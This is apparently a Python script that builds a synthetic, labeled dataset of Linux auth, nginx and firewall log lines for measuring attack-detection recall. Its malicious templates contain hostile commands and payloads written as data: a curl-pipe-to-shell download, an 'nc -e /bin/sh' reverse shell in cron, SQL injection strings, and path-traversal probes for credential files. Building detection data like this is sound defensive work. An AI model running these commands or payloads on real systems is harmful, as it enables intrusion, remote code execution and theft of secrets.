"""Generate a deterministic labeled log-line dataset (auth.log + web access + firewall style).
Labels: 0 = benign, 1 = malicious. Written to dataset.jsonl with fields {line, label, family}.
Synthetic but shaped like real Linux/nginx/iptables lines; families let us report per-attack recall."""
import json, random
R = random.Random(20260920)
hosts = ["web1", "web2", "db1", "bastion", "sw-core"]
users = ["alice", "bob", "carol", "deploy", "backup"]
inside = lambda: f"10.{R.randint(0,3)}.{R.randint(0,255)}.{R.randint(1,254)}"
outside = lambda: f"{R.choice([45,91,103,185,193,203])}.{R.randint(0,255)}.{R.randint(0,255)}.{R.randint(1,254)}"
def ts(): return f"Sep {R.randint(1,28):2d} {R.randint(0,23):02d}:{R.randint(0,59):02d}:{R.randint(0,59):02d}"
def pid(): return R.randint(1000, 60000)
rows = []
def add(line, label, family): rows.append(dict(line=line, label=label, family=family))
# benign
for _ in range(100):
    h, u = R.choice(hosts), R.choice(users)
    k = R.randint(0, 9)
    if k == 0: add(f"{ts()} {h} sshd[{pid()}]: Accepted publickey for {u} from {inside()} port {R.randint(30000,60000)} ssh2: ED25519 SHA256:abcd", 0, "ssh-ok")
    elif k == 1: add(f"{ts()} {h} sudo: {u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", 0, "sudo-ok")
    elif k == 2: add(f"{ts()} {h} CRON[{pid()}]: ({u}) CMD (/usr/local/bin/backup.sh)", 0, "cron")
    elif k == 3: add(f"{ts()} {h} nginx: {inside()} - - \"GET /index.html HTTP/1.1\" 200 {R.randint(500,9000)} \"-\" \"Mozilla/5.0\"", 0, "web-ok")
    elif k == 4: add(f"{ts()} {h} nginx: {outside()} - - \"GET /api/v1/status HTTP/1.1\" 200 {R.randint(100,900)} \"-\" \"curl/8.5.0\"", 0, "web-ok")
    elif k == 5: add(f"{ts()} {h} systemd[1]: Started Daily apt download activities.", 0, "system")
    elif k == 6: add(f"{ts()} {h} kernel: [{R.randint(1000,99999)}.{R.randint(0,999999):06d}] eth0: link up, 1000Mbps, full-duplex", 0, "system")
    elif k == 7: add(f"{ts()} {h} sshd[{pid()}]: Failed password for {u} from {inside()} port {R.randint(30000,60000)} ssh2", 0, "ssh-typo")
    elif k == 8: add(f"{ts()} {h} sshd[{pid()}]: Disconnected from user {u} {inside()} port {R.randint(30000,60000)}", 0, "ssh-ok")
    else: add(f"{ts()} {h} kernel: [{R.randint(1000,99999)}.000000] IPTABLES-DROP: IN=eth0 SRC={outside()} DST=10.0.0.5 PROTO=UDP DPT=5353", 0, "fw-noise")
# malicious
for _ in range(15):
    ip = outside()
    add(f"{ts()} bastion sshd[{pid()}]: Failed password for invalid user {R.choice(['admin','oracle','test','ubuntu','pi'])} from {ip} port {R.randint(30000,60000)} ssh2", 1, "ssh-bruteforce")
for _ in range(8):
    add(f"{ts()} bastion sshd[{pid()}]: Accepted password for root from {outside()} port {R.randint(30000,60000)} ssh2", 1, "root-login-external")
for _ in range(10):
    p = R.choice(["/login.php?user=admin'%20OR%201=1--", "/search?q=1%20UNION%20SELECT%20password%20FROM%20users", "/index.php?id=1;DROP%20TABLE%20users"])
    add(f"{ts()} web1 nginx: {outside()} - - \"GET {p} HTTP/1.1\" {R.choice([200,500])} 512 \"-\" \"sqlmap/1.8\"", 1, "sqli")
for _ in range(8):
    p = R.choice(["/../../../../etc/passwd", "/cgi-bin/.%2e/%2e%2e/bin/sh", "/.env", "/wp-admin/setup-config.php", "/.git/config"])
    add(f"{ts()} web2 nginx: {outside()} - - \"GET {p} HTTP/1.1\" {R.choice([404,403,200])} 162 \"-\" \"python-requests/2.31\"", 1, "path-traversal-scan")
for _ in range(6):
    add(f"{ts()} db1 sudo: {R.choice(users)} : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://{outside()}/x.sh | sh'", 1, "sudo-download-exec")
for _ in range(6):
    add(f"{ts()} web1 kernel: [{R.randint(1000,99999)}.000000] IPTABLES-DROP: IN=eth0 SRC={outside()} DST=10.0.0.5 PROTO=TCP DPT={R.choice([22,23,3389,445,1433])} SYN", 1, "port-scan")
for _ in range(5):
    add(f"{ts()} db1 useradd[{pid()}]: new user: name={R.choice(['sysadm1n','support','.hidden'])}, UID=0, GID=0, home=/root, shell=/bin/bash", 1, "uid0-user-added")
for _ in range(5):
    add(f"{ts()} web2 CRON[{pid()}]: (www-data) CMD (/bin/sh -c 'nc -e /bin/sh {outside()} 4444')", 1, "reverse-shell-cron")
R.shuffle(rows)
with open(__file__.rsplit("/",1)[0] + "/dataset.jsonl", "w") as f:
    for r in rows: f.write(json.dumps(r) + "\n")
print(len(rows), "lines,", sum(r["label"] for r in rows), "malicious")
